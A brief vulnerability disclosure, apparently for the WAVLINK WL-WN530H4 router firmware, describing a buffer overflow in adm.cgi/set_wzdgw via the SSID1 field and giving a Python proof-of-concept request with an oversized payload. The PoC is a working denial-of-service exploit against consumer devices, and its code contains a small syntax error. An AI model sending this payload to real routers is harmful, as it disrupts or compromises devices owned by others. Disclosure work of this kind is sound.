# buff overflow

## WAVLINK_WL_WN530H4

version: 20220801

## Description:

There is a buff overflow in adm.cgi/set_wzdgw

## Source:

you may download it from : [WL-WN530H4 - WAVLINK See the world! Powered by Wavlink](https://www.wavlink.com/en_us/firmware/details/c5834c4010.html)

## Analyse:

![](4.png)

get value from SSID1, if TouchLinkEn was set, call sprintf, cause buff overflow

## POC

```
url = "http://192.168.0.1/cgi-bin/adm.cgi"
payload = 'a'*0x1000 + '\n'

r = requests.post(url, data={ 'page':'wzdgw', 'SSID1': + payload})
```
